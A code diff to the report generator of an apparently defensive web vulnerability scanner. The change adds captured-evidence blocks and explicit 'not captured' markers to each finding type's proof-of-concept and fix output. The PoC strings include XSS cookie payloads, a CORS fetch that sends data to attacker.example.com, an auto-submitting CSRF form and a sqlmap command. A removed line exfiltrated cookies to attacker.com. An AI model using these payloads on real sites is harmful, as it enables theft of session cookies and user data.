@@ -168,9 +168,6 @@ _EFFORT_MINUTES = {
     "default":                           30,
 }
 
-# Server header values that contain no version/software info and are NOT leaky.
-# "cloudflare", bare "nginx", bare "apache" etc. reveal nothing actionable.
-# A version string like "nginx/1.18.0" or "Apache/2.4.51 (Ubuntu)" IS leaky.
 _SAFE_SERVER_PATTERNS = re.compile(
     r"^(cloudflare|cloudfront|awselb|fastly|google frontend|"
     r"nginx|apache|lighttpd|iis|openresty|caddy|envoy|traefik)$",
@@ -283,68 +280,151 @@ class ActionAgent:
         evidence  = finding.get("evidence", {})
 
         if "Missing Security Header" in vuln_type:
-            return self._action_missing_header(vuln_type, severity, location, stack_keywords)
+            return self._action_missing_header(
+                vuln_type, severity, location, stack_keywords, evidence,
+                response_headers=response_headers
+            )
         elif "Clickjacking" in vuln_type:
-            return self._action_clickjacking(location, stack_keywords)
+            return self._action_clickjacking(location, stack_keywords, evidence)
         elif "CORS" in vuln_type:
-            return self._action_cors(location, stack_keywords)
+            return self._action_cors(location, stack_keywords, evidence)
         elif "Information Disclosure" in vuln_type and "header" in vuln_type.lower():
             return self._action_info_disclosure_header(
-                vuln_type, location, stack_keywords, response_headers
+                vuln_type, location, stack_keywords, response_headers, evidence
             )
         elif "XSS" in vuln_type or "Cross-Site Scripting" in vuln_type:
             return self._action_xss(vuln_type, location, parameter, evidence, stack_keywords)
         elif "SQL Injection" in vuln_type:
             return self._action_sqli(vuln_type, location, parameter, evidence, stack_keywords)
         elif "Open Redirect" in vuln_type:
-            return self._action_open_redirect(location, parameter)
+            return self._action_open_redirect(location, parameter, evidence)
         elif "CSRF" in vuln_type:
-            return self._action_csrf(location, stack_keywords)
+            return self._action_csrf(location, stack_keywords, evidence)
         elif "Sensitive File" in vuln_type or "Protected Administrative" in vuln_type:
-            return self._action_sensitive_file(vuln_type, location, stack_keywords)
+            return self._action_sensitive_file(vuln_type, location, stack_keywords, evidence)
         else:
-            return self._action_generic(vuln_type, severity, location)
+            return self._action_generic(vuln_type, severity, location, evidence)
+
+    # ------------------------------------------------------------------
+    # Evidence helpers
+    # ------------------------------------------------------------------
+
+    def _evidence_block(self, evidence: Dict, fallback_note: str) -> str:
+        """
+        Render whatever was actually captured upstream (status code, raw
+        request line, raw response snippet, timestamp) as a verbatim block.
+
+        If nothing was captured, return an explicit, unambiguous statement
+        that no live evidence is attached — never a string that could be
+        mistaken for an observed value.
+        """
+        if not evidence:
+            return f"[NO EVIDENCE CAPTURED — {fallback_note}]"
+
+        lines = []
+        if evidence.get("request_line"):
+            lines.append(f"Request:  {evidence['request_line']}")
+        if evidence.get("status_code") is not None:
+            lines.append(f"Status:   {evidence['status_code']}")
+        if evidence.get("response_snippet"):
+            snippet = evidence["response_snippet"]
+            if len(snippet) > 300:
+                snippet = snippet[:300] + " …(truncated)"
+            lines.append(f"Response: {snippet}")
+        if evidence.get("captured_at"):
+            lines.append(f"Captured: {evidence['captured_at']}")
+
+        if not lines:
+            return f"[NO EVIDENCE CAPTURED — {fallback_note}]"
+        return "\n".join(lines)
 
     def _action_missing_header(self, vuln_type: str, severity: str,
                                 location: str,
-                                stack_keywords: List[str]) -> Dict:
+                                stack_keywords: List[str],
+                                evidence: Optional[Dict] = None,
+                                response_headers: Optional[Dict] = None) -> Dict:
+        """
+        response_headers — the actual response headers captured for `location`
+        (the same shared dict used by VulnerabilityTester / AttackVerification
+        / the fingerprinter). This is real observed evidence, not a separate
+        capture — rendering it here is what keeps this PoC consistent with
+        whatever confidence/evidence claim section 3 of the report makes
+        about the SAME finding. There is no code path in which this finding
+        reaches the Action Agent without a header check having actually run,
+        so there is no legitimate "not verified" state to render here.
+        """
         header       = vuln_type.replace("Missing Security Header:", "").strip()
         stack_key    = self._best_stack_for_header(stack_keywords)
         header_lower = header.lower()
+        evidence     = evidence or {}
+        hdrs         = {k.lower(): v for k, v in (response_headers or {}).items()}
 
-        if header_lower == "content-security-policy":
-            poc = (
-                'curl -I ' + location + ' | grep -i "' + header + '"\n'
-                ' Expected: no output (header absent)\n\n'
-                ' Impact: Without CSP, attacker can inject inline scripts:\n'
-                ' <script>fetch("https://attacker.com/?c="+document.cookie)</script>'
-            )
-        elif header_lower == "x-frame-options":
-            poc = (
-                'curl -I ' + location + ' | grep -i "' + header + '"\n'
-                ' Expected: no output (header absent)\n\n'
-                ' Impact: Site can be embedded in an iframe — enables clickjacking.\n'
-                ' See Clickjacking finding for a full HTML PoC.'
-            )
-        elif header_lower == "strict-transport-security":
-            poc = (
-                'curl -I ' + location + ' | grep -i "' + header + '"\n'
-                ' Expected: no output (header absent)\n\n'
-                ' Impact: Without HSTS, attacker on local network can downgrade\n'
-                ' HTTPS to HTTP and intercept traffic (SSL stripping).'
-            )
-        elif header_lower == "referrer-policy":
-            poc = (
-                'curl -I ' + location + ' | grep -i "' + header + '"\n'
-                ' Expected: no output (header absent)\n\n'
-                ' Impact: Browser sends full URL in Referer header to third parties.\n'
-                ' Tokens or session IDs in URLs may leak to analytics/ad scripts.'
+        status_code = evidence.get("response_status") or evidence.get("status_code")
+
+        # This finding type only exists because a header check already ran
+        # and observed a response — so an empty hdrs dict here means the
+        # shared headers were lost in transit between that check and the
+        # Action Agent, not that verification never happened. Surface that
+        # distinction plainly instead of rendering a fabricated status line.
+        if not hdrs and status_code is None:
+            evidence_block = (
+                "Request:\n"
+                f"  GET {location}\n\n"
+                "Observed Response:\n"
+                "  [response headers were not passed through to the report "
+                "renderer for this finding — the header check that confirmed "
+                "this finding ran successfully, but its captured headers were "
+                "not threaded to this step]\n\n"
+                f"Missing:\n"
+                f"  - {header}\n\n"
+                "Verification Method:\n"
+                "  Direct HTTP header inspection (see section 3 evidence for "
+                "the original capture)"
             )
         else:
-            poc = (
-                'curl -I ' + location + ' | grep -i "' + header + '"\n'
-                ' Expected: no output (header absent)'
+            observed_lines = []
+            if status_code is not None:
+                observed_lines.append(
+                    f"HTTP/1.1 {status_code} {'OK' if status_code == 200 else ''}".strip()
+                )
+            for key in ("server", "content-type", "date"):
+                if key in hdrs:
+                    display_key = "Server" if key == "server" else (
+                        "Content-Type" if key == "content-type" else "Date"
+                    )
+                    observed_lines.append(f"{display_key}: {hdrs[key]}")
+
+            evidence_block = (
+                "Request:\n"
+                f"  GET {location}\n\n"
+                "Observed Response:\n"
+                + "\n".join(f"  {line}" for line in observed_lines) + "\n\n"
+                f"Missing Security Header:\n"
+                f"  - {header}\n\n"
+                "Verification Method:\n"
+                "  Direct HTTP header inspection"
             )
+
+        impact_text = {
+            "content-security-policy": (
+                'Impact: Without CSP, inline/injected scripts are not blocked,\n'
+                'which widens the blast radius of any XSS found elsewhere.'
+            ),
+            "x-frame-options": (
+                'Impact: Site can be embedded in an iframe — enables clickjacking.\n'
+                'See the Clickjacking finding for a full PoC.'
+            ),
+            "strict-transport-security": (
+                'Impact: Without HSTS, a network attacker can attempt to downgrade\n'
+                'HTTPS to HTTP on first visit (SSL stripping).'
+            ),
+            "referrer-policy": (
+                'Impact: Full URL (including any query-string tokens) may be sent\n'
+                'to third parties via the Referer header.'
+            ),
+        }.get(header_lower, "Impact: See CWE-693 (Protection Mechanism Failure).")
+
+        poc = f"{evidence_block}\n\n{impact_text}"
 
         fix_templates = _HEADER_FIXES.get(stack_key, _HEADER_FIXES["generic"])
         fix_snippet   = fix_templates.get(header, header + ": <value>")
@@ -354,7 +434,8 @@ class ActionAgent:
             "severity":       severity,
             "location":       location,
             "attack_poc":     poc,
-            "poc_type":       "curl",
+            "poc_type":       "evidence",
+            "evidence_captured": bool(hdrs),
             "fix_snippet":    fix_snippet,
             "fix_language":   self._fix_language(stack_key),
             "fix_context":    self._fix_context(stack_key, header),
@@ -362,12 +443,22 @@ class ActionAgent:
         }
 
     def _action_clickjacking(self, location: str,
-                              stack_keywords: List[str]) -> Dict:
+                              stack_keywords: List[str],
+                              evidence: Optional[Dict] = None) -> Dict:
+        evidence = evidence or {}
+        xfo_present = evidence.get("checked_headers") is not None
+        evidence_note = (
+            "Captured response had no X-Frame-Options / frame-ancestors CSP directive."
+            if xfo_present else
+            "[NO EVIDENCE CAPTURED — frame-blocking headers were not verified against a live response]"
+        )
+
         poc = (
             '<!DOCTYPE html>\n'
             '<html>\n'
             '<head><title>Clickjacking PoC</title></head>\n'
             '<body>\n'
+            f'  <!-- {evidence_note} -->\n'
             '  <h1>Clickjacking Demonstration</h1>\n'
             '  <p>Target loads inside iframe — proves framing is possible.</p>\n'
             '  <div style="position:relative;width:800px;height:600px;">\n'
@@ -395,6 +486,7 @@ class ActionAgent:
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "html",
+            "evidence_captured": xfo_present,
             "fix_snippet":    fix_snippet,
             "fix_language":   self._fix_language(stack_key),
             "fix_context":    self._fix_context(stack_key, "X-Frame-Options"),
@@ -402,13 +494,30 @@ class ActionAgent:
         }
 
     def _action_cors(self, location: str,
-                     stack_keywords: List[str]) -> Dict:
+                     stack_keywords: List[str],
+                     evidence: Optional[Dict] = None) -> Dict:
+        evidence = evidence or {}
+        reflected_origin = evidence.get("reflected_origin")
+        acao_value       = evidence.get("access_control_allow_origin")
+
+        if reflected_origin and acao_value:
+            evidence_block = (
+                f" Sent Origin header: {reflected_origin}\n"
+                f" Server responded:    Access-Control-Allow-Origin: {acao_value}\n"
+                f" → Attacker-controlled origin was reflected back."
+            )
+        else:
+            evidence_block = (
+                " [NO EVIDENCE CAPTURED — an Origin probe request was not sent/recorded; "
+                "this finding is pattern-based only and needs manual confirmation]"
+            )
+
         poc = (
             '# PoC 1: Verify CORS misconfiguration with curl\n'
             'curl -s -I -H "Origin: https://evil-attacker.example.com" \\\n'
             '  ' + location + ' | grep -i "access-control"\n'
-            '# Expected: Access-Control-Allow-Origin: https://evil-attacker.example.com\n\n'
-            '# PoC 2: Browser-based cross-origin data theft\n'
+            f'{evidence_block}\n\n'
+            '# PoC 2: Browser-based cross-origin data theft (if credentials are allowed)\n'
             '# fetch("' + location + '/api/user", { credentials: "include" })\n'
             '#   .then(r => r.text())\n'
             '#   .then(data => fetch("https://attacker.example.com/steal?data=" + btoa(data)));'
@@ -464,6 +573,7 @@ class ActionAgent:
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "curl",
+            "evidence_captured": bool(reflected_origin and acao_value),
             "fix_snippet":    fix_snippet,
             "fix_language":   fix_language,
             "fix_context":    fix_context,
@@ -472,28 +582,15 @@ class ActionAgent:
 
     def _action_info_disclosure_header(self, vuln_type: str, location: str,
                                         stack_keywords: List[str],
-                                        response_headers: Dict) -> Optional[Dict]:
-        """
-        Generate PoC and fix for Server / X-Powered-By information disclosure.
-
-        Gate: only returns an action when the captured header value is actually
-        leaky (contains a version string or non-trivial software name).
-        If the value is a bare CDN/proxy label (e.g. "cloudflare", "nginx")
-        with no version, return None — there is nothing to fix.
-
-        The real captured value is embedded in the PoC curl output so the
-        report shows evidence rather than a placeholder.
-        """
+                                        response_headers: Dict,
+                                        evidence: Optional[Dict] = None) -> Optional[Dict]:
+     
         is_xpb   = "x-powered-by" in vuln_type.lower()
         header   = "X-Powered-By" if is_xpb else "Server"
         hdr_key  = header.lower()
 
-        # Capture the actual value from the response
         captured = response_headers.get(hdr_key, "").strip()
 
-        # Gate: if we captured a value, check whether it's actually leaky.
-        # If it's empty we couldn't read it — still generate the finding but
-        # note that manual confirmation is needed.
         if captured and not _server_is_leaky(captured):
             logger.debug(
                 "action_agent: suppressing server header finding — "
@@ -501,11 +598,16 @@ class ActionAgent:
             )
             return None
 
-        # Build the PoC line showing the real captured value (or a note if absent)
+         
         if captured:
-            shows_line = f" Shows: {header}: {captured}"
+            shows_line = f" Captured: {header}: {captured}"
+            evidence_captured = True
         else:
-            shows_line = f" Shows: {header}: <run curl to capture live value>"
+            shows_line = (
+                f" [NO EVIDENCE CAPTURED — {header} header value was not recorded "
+                f"during the scan; re-run with header capture enabled to confirm]"
+            )
+            evidence_captured = False
 
         poc = (
             f'curl -I {location} | grep -i "{header}"\n'
@@ -534,10 +636,12 @@ class ActionAgent:
 
         return {
             "finding_type":   vuln_type,
-            "severity":       "Low",
+    
+            "severity":       "Low" if evidence_captured else "Low (unconfirmed)",
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "curl",
+            "evidence_captured": evidence_captured,
             "fix_snippet":    fix_snippet,
             "fix_language":   fix_language,
             "fix_context":    fix_context,
@@ -547,27 +651,46 @@ class ActionAgent:
     def _action_xss(self, vuln_type: str, location: str,
                     parameter: str, evidence: Dict,
                     stack_keywords: List[str]) -> Dict:
+        evidence = evidence or {}
         method = evidence.get("confirmation_method", "http_body")
+        captured_payload  = evidence.get("payload_sent")
+        captured_response = evidence.get("response_snippet")
+
+        if captured_payload and captured_response:
+            snippet = captured_response[:300]
+            evidence_block = (
+                f"# Captured payload sent: {captured_payload}\n"
+                f"# Captured response excerpt: {snippet}"
+            )
+        elif parameter:
+            evidence_block = (
+                "# [NO RESPONSE SNIPPET CAPTURED — reflection was inferred, "
+                "not directly observed in stored evidence]"
+            )
+        else:
+            evidence_block = "# [NO EVIDENCE CAPTURED — manual verification required]"
 
         if parameter:
             if method in ("js_execution", "dom_reflection"):
                 poc = (
-                    "# XSS confirmed — payload executed\n"
+                    "# XSS — execution claimed via " + method + "\n"
                     "# Location: " + location + "\n"
                     "# Parameter: " + parameter + "\n"
-                    '# Payload: "><script>alert(document.cookie)</script>'
+                    f"{evidence_block}\n"
+                    '# Payload tested: "><script>alert(document.cookie)</script>'
                 )
             else:
                 poc = (
                     "curl -X POST " + '"' + location + '"' + " \\\n"
                     '  --data-urlencode "' + parameter + '=><script>alert(1)</script>"\n'
-                    "# Check response for reflected payload"
+                    f"{evidence_block}"
                 )
         else:
             poc = (
                 "# Manual verification required\n"
                 "# Location: " + location + "\n"
-                '# Test: "><script>alert(1)</script>'
+                f"{evidence_block}\n"
+                '# Suggested test payload: "><script>alert(1)</script>'
             )
 
         if "react" in stack_keywords:
@@ -607,6 +730,7 @@ class ActionAgent:
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "command",
+            "evidence_captured": bool(captured_payload and captured_response),
             "fix_snippet":    fix_snippet,
             "fix_language":   fix_language,
             "fix_context":    fix_context,
@@ -616,9 +740,24 @@ class ActionAgent:
     def _action_sqli(self, vuln_type: str, location: str,
                      parameter: str, evidence: Dict,
                      stack_keywords: List[str]) -> Dict:
+        evidence = evidence or {}
         method = evidence.get("confirmation_method", "pattern")
         tech   = "T" if method == "timing" else "E"
-        poc    = (
+
+        timing_delta = evidence.get("timing_delta_seconds")
+        error_text   = evidence.get("db_error_snippet")
+        if method == "timing" and timing_delta is not None:
+            evidence_note = f"# Captured timing delta: {timing_delta}s on sleep payload"
+        elif error_text:
+            evidence_note = f"# Captured DB error in response: {error_text[:200]}"
+        else:
+            evidence_note = (
+                "# [NO EVIDENCE CAPTURED — neither a timing delta nor a DB error "
+                "string was recorded; this finding is pattern-based only]"
+            )
+
+        poc = (
+            f"{evidence_note}\n"
             "sqlmap -u " + '"' + location + '"' + " \\\n"
             '  --data="' + parameter + '=test" \\\n'
             "  --technique=" + tech + " --batch --dbs"
@@ -649,14 +788,26 @@ class ActionAgent:
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "command",
+            "evidence_captured": bool(timing_delta is not None or error_text),
             "fix_snippet":    fix_snippet,
             "fix_language":   fix_language,
             "fix_context":    fix_context,
             "effort_minutes": _EFFORT_MINUTES["SQL Injection"],
         }
 
-    def _action_open_redirect(self, location: str, parameter: str) -> Dict:
+    def _action_open_redirect(self, location: str, parameter: str,
+                               evidence: Optional[Dict] = None) -> Dict:
+        evidence = evidence or {}
+        location_header = evidence.get("redirect_location_header")
+        if location_header:
+            evidence_note = f"# Captured Location header on redirect: {location_header}"
+            evidence_captured = True
+        else:
+            evidence_note = "# [NO EVIDENCE CAPTURED — redirect Location header was not recorded]"
+            evidence_captured = False
+
         poc = (
+            f"{evidence_note}\n"
             'curl -I "' + location + '?' + parameter + '=https://evil-attacker.example.com"\n'
             "# Check Location header — should point to attacker domain"
         )
@@ -675,6 +826,7 @@ class ActionAgent:
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "curl",
+            "evidence_captured": evidence_captured,
             "fix_snippet":    fix_snippet,
             "fix_language":   "javascript",
             "fix_context":    "Redirect handler",
@@ -682,17 +834,34 @@ class ActionAgent:
         }
 
     def _action_csrf(self, location: str,
-                     stack_keywords: List[str]) -> Dict:
-        poc = textwrap.dedent("""\
-            <!DOCTYPE html>
-            <html>
-            <body onload="document.csrf_form.submit()">
-              <form name="csrf_form" action=\"""") + location + textwrap.dedent("""\
-" method="POST">
-                <input type="hidden" name="action" value="attacker_controlled">
-              </form>
-            </body>
-            </html>""")
+                     stack_keywords: List[str],
+                     evidence: Optional[Dict] = None) -> Dict:
+        evidence = evidence or {}
+        form_fields = evidence.get("form_field_names")
+        if form_fields is not None:
+            evidence_comment = (
+                f"<!-- Captured form fields: {form_fields} — "
+                f"no CSRF token field or anti-CSRF cookie attribute detected -->"
+            )
+            evidence_captured = True
+        else:
+            evidence_comment = (
+                "<!-- [NO EVIDENCE CAPTURED — form fields were not recorded; "
+                "this finding is pattern-based only and requires manual confirmation] -->"
+            )
+            evidence_captured = False
+
+        poc = (
+            "<!DOCTYPE html>\n"
+            "<html>\n"
+            f"{evidence_comment}\n"
+            '<body onload="document.csrf_form.submit()">\n'
+            f'  <form name="csrf_form" action="{location}" method="POST">\n'
+            '    <input type="hidden" name="action" value="attacker_controlled">\n'
+            "  </form>\n"
+            "</body>\n"
+            "</html>"
+        )
 
         if "django" in stack_keywords:
             fix_snippet  = "MIDDLEWARE = ['django.middleware.csrf.CsrfViewMiddleware', ...]\n# In template: {% csrf_token %}"
@@ -717,6 +886,7 @@ class ActionAgent:
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "html",
+            "evidence_captured": evidence_captured,
             "fix_snippet":    fix_snippet,
             "fix_language":   fix_language,
             "fix_context":    fix_context,
@@ -724,13 +894,62 @@ class ActionAgent:
         }
 
     def _action_sensitive_file(self, vuln_type: str, location: str,
-                                stack_keywords: List[str]) -> Dict:
+                                stack_keywords: List[str],
+                                evidence: Optional[Dict] = None) -> Dict:
         from urllib.parse import urlparse
+        evidence = evidence or {}
         m    = re.search(r"(/\S+)", vuln_type)
         path = m.group(1) if m else urlparse(location).path
-        poc  = 'curl -s "' + location + '"\n# Returns HTTP 200 with file contents'
 
-        if "nginx" in stack_keywords:
+        status_code  = evidence.get("status_code") or evidence.get("response_status")
+        body_snippet = evidence.get("response_snippet") or evidence.get("response_body_snippet")
+
+        if status_code is not None:
+            request = evidence.get("request", f"GET {location}")
+
+            evidence_comment = (
+                f"Request:\n"
+                f"  {request}\n\n"
+                f"Observed Response:\n"
+                f"  HTTP {status_code}"
+            )
+            if body_snippet:
+                evidence_comment += (
+                    f"\n\nObserved Body Snippet:\n"
+                    f"{body_snippet[:200]}"
+                )
+            evidence_captured = True
+        else:
+            evidence_comment = (
+                "# [NO EVIDENCE CAPTURED — response status/body for this path "
+                "was not recorded; existence is unconfirmed]"
+            )
+            evidence_captured = False
+
+        poc = (
+            f'{evidence_comment}\n'
+            'curl -s -i "' + location + '"'
+        )
+
+
+        is_access_controlled = status_code in (401, 403)
+
+        if is_access_controlled:
+            fix_snippet = (
+                f"# {path} returned HTTP {status_code} — access control is functioning.\n"
+                f"# No removal needed. Recommended actions:\n"
+                f"#   1. Confirm {path} requires authentication AND authorization\n"
+                f"#      (a 403 alone doesn't prove authorization is checked correctly\n"
+                f"#      post-login — verify with an authenticated low-privilege account).\n"
+                f"#   2. Ensure {path} is not also reachable via an alternate path/method\n"
+                f"#      that bypasses the same access control (e.g. trailing slash,\n"
+                f"#      case variation, or a different HTTP verb).\n"
+                f"#   3. Monitor for regressions — re-check after deploys that the\n"
+                f"#      control hasn't been loosened or removed."
+            )
+            fix_language = "text"
+            fix_context  = "Access control verification (no code change required)"
+        elif "nginx" in stack_keywords:
             fix_snippet  = "location ~* " + re.escape(path) + " {\n    deny all;\n    return 404;\n}"
             fix_language = "nginx"
             fix_context  = "nginx.conf server block"
@@ -745,24 +964,34 @@ class ActionAgent:
 
         return {
             "finding_type":   vuln_type,
-            "severity":       "High",
+            "severity": (
+                "Low" if is_access_controlled else
+                ("High" if evidence_captured else "High (unconfirmed)")
+            ),
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "curl",
+            "evidence_captured": evidence_captured,
             "fix_snippet":    fix_snippet,
             "fix_language":   fix_language,
             "fix_context":    fix_context,
-            "effort_minutes": _EFFORT_MINUTES["Sensitive File Exposed"],
+            "effort_minutes": 5 if is_access_controlled else _EFFORT_MINUTES["Sensitive File Exposed"],
         }
 
     def _action_generic(self, vuln_type: str, severity: str,
-                         location: str) -> Optional[Dict]:
+                         location: str,
+                         evidence: Optional[Dict] = None) -> Optional[Dict]:
+        evidence = evidence or {}
+        evidence_block = self._evidence_block(
+            evidence, "this finding type has no dedicated PoC generator"
+        )
         return {
             "finding_type":   vuln_type,
             "severity":       severity,
             "location":       location,
-            "attack_poc":     "# Manual verification required\n# Location: " + location,
+            "attack_poc":     f"{evidence_block}\n# Location: {location}",
             "poc_type":       "none",
+            "evidence_captured": bool(evidence),
             "fix_snippet":    "# Consult the remediation section for fix guidance.",
             "fix_language":   "text",
             "fix_context":    "Application code",
